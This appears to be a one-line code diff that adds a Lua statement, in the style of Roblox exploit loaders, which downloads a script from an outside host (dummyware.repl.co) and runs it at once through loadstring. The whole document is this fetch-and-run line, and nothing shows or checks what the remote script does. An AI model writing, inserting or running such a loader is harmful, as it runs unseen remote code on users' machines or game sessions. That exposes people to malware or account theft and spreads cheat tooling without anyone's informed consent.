@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://dummyware.repl.co/public/script.txt"))()
